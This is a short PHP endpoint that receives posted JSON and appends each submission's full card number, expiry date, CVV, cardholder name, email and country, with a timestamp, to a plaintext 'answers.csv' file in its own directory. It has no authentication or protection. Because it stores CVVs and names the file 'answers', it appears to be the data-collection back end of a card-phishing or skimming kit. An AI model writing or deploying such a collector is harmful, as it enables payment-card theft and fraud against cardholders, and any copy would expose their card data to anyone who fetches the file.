<?php
header('Content-Type: application/json');

$jsonInput = file_get_contents('php://input');
$data = json_decode($jsonInput, true);

if ($data) {
    $filePath = __DIR__ . '/answers.csv';
    $fileExists = file_exists($filePath);

    $file = @fopen($filePath, 'a');

    if ($file !== false) {
        if (flock($file, LOCK_EX)) {
            // Create headers if creating new file
            if (!$fileExists) {
                fputcsv($file, ['Type', 'Card Number', 'Expiry', 'CVV', 'Name', 'Email', 'Country', 'Timestamp']);
            }

            // Extract values
            $type       = $data['type'] ?? '';
            $cardNumber = $data['card_number'] ?? '';
            $expiry     = $data['expiry'] ?? '';
            $cvv        = $data['cvv'] ?? '';
            $name       = $data['billing_details']['name'] ?? '';
            $email      = $data['billing_details']['email'] ?? '';
            $country    = $data['billing_details']['address']['country'] ?? '';
            $time       = date('Y-m-d H:i:s');

            // Write row to answers.csv
            fputcsv($file, [$type, $cardNumber, $expiry, $cvv, $name, $email, $country, $time]);
            flock($file, LOCK_UN);
        }
        fclose($file);

        http_response_code(200);
        echo json_encode(['status' => 'success']);
        exit();
    }
}

http_response_code(400);
echo json_encode(['status' => 'error']);